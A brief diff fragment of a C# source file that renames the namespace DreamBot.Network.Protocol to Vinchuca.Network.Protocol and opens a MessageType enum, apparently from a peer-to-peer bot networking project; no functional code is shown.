@@ -1,7 +1,7 @@
 using System;
-using DreamBot.Network.Protocol.Handlers;
+using Vinchuca.Network.Protocol.Handlers;
 
-namespace DreamBot.Network.Protocol.Messages
+namespace Vinchuca.Network.Protocol.Messages
 {
     public enum MessageType
     {
